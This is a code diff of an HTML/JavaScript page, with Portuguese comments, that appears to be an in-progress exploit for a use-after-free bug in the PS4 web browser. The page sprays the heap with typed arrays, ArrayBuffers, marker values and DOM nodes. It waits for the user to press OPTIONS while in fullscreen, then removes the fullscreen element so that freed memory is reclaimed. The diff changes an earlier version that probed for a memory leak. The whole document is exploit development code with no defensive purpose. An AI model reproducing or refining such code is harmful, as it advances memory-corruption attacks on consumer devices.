@@ -2,80 +2,101 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>UAF → DOM Leak</title>
+<title>PS4 UAF - Aggressive Reclaim REAL</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF DOM Leak Probe</h2>
+<h2>Aggressive Reclaim (Real)</h2>
 <button onclick="run()">Run</button>
 
-<pre id="log"></pre>
+<div id="log"></div>
 
 <script>
-function log(m){
-    document.getElementById("log").textContent += m + "\n";
+function log(msg){
+    try { console.log(msg); } catch(e){}
+    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
+}
+
+function setupHeap(){
+    let controllers = [];
+    for(let i = 0; i < 5000; i++){
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        controllers.push(arr);
+    }
+    return controllers;
 }
 
 function setupFS(){
-    let d = document.createElement("div");
-    d.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>PRESS OPTIONS</h1>";
-    d.style = "position:absolute;top:0;left:0;width:100%;height:100%;background:black;";
-    document.body.appendChild(d);
-    d.webkitRequestFullscreen();
-    return d;
+    let fsTarget = document.createElement("div");
+    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>PRESS OPTIONS</h1>";
+    fsTarget.style = "position:absolute;top:0;left:0;width:100%;height:100%;background:black;";
+    document.body.appendChild(fsTarget);
+    fsTarget.webkitRequestFullscreen();
+    return fsTarget;
 }
 
-// 🔥 RECLAIM AGRESSIVO (igual ao que funcionou)
-function aggressiveReclaim() {
-    log("[*] reclaim agressivo");
+// 🔥 LOOP AGRESSIVO CONTÍNUO
+function startAggressiveReclaim(){
+    log("[*] Aggressive reclaim LOOP iniciado");
 
-    let nodes = [];
+    let running = true;
 
-    for (let i = 0; i < 20000; i++) {
-        let d = document.createElement("div");
+    function sprayRound(){
+        if (!running) return;
 
-        // padrão identificável
-        d.textContent = "LEAK_" + i + "_AAAAAAAAAAAAAAAAAAAA";
+        let junk = [];
 
-        nodes.push(d);
-    }
+        // 🔥 mistura pesada
+        for(let i = 0; i < 2000; i++){
 
-    return nodes;
-}
+            // ArrayBuffer
+            let buf = new ArrayBuffer(0x100);
+            let f64 = new Float64Array(buf);
+            f64[0] = 13.37;
 
-// 🔬 leak probe
-function probe(nodes) {
-    log("---- PROBE ----");
+            // Uint32
+            let u32 = new Uint32Array(buf);
+            u32[0] = 0x41414141;
 
-    for (let i = 0; i < nodes.length; i++) {
-        let txt = nodes[i].textContent;
+            // string
+            let str = "REUSE_" + i + "_" + Math.random();
 
-        // 🔥 detectar corrupção
-        if (!txt.includes("LEAK_")) {
-            log("[!!!] STRING CORROMPIDA");
-            log(txt);
-            return;
+            // DOM
+            let div = document.createElement("div");
+            div.textContent = str;
+
+            junk.push(f64);
+            junk.push(u32);
+            junk.push(str);
+            junk.push(div);
         }
 
-        if (txt.length > 100) {
-            log("[!!!] POSSÍVEL LEAK");
-            log(txt);
-            return;
-        }
+        // 🔥 força GC parcial
+        junk = null;
+
+        // loop contínuo
+        setTimeout(sprayRound, 0);
     }
 
-    log("[OK] nenhuma anomalia detectada");
+    sprayRound();
+
+    return () => { running = false; };
 }
 
-function trigger(fsTarget) {
-    log("[*] trigger");
+function trigger(fsTarget){
+    log("[*] Trigger");
 
-    fsTarget.remove();
-    document.webkitExitFullscreen();
+    try {
+        fsTarget.remove();
 
-    let nodes = aggressiveReclaim();
+        if (document.webkitIsFullScreen || document.fullscreenElement) {
+            document.webkitExitFullscreen?.();
+        }
 
-    setTimeout(() => probe(nodes), 50);
+    } catch(e){
+        log("[ERRO] " + e);
+    }
 
     // 🔴 NÃO MEXER
     setTimeout(() => location.reload(), 500);
@@ -84,13 +105,29 @@ function trigger(fsTarget) {
 function run(){
     log("Running... Press OPTIONS");
 
-    let fs = setupFS();
+    let controllers = setupHeap();
+    let fsTarget = setupFS();
 
     window.onblur = function(){
         log("[*] onblur");
 
         setTimeout(() => {
-            trigger(fs);
+
+            log("[*] Janela crítica iniciada");
+
+            // 🔥 começa reclaim CONTÍNUO
+            let stopReclaim = startAggressiveReclaim();
+
+            // pequeno delay pra acumular pressão
+            setTimeout(() => {
+
+                trigger(fsTarget);
+
+                // opcional: parar depois
+                setTimeout(() => stopReclaim(), 200);
+
+            }, 50);
+
         }, 3000);
     };
 }
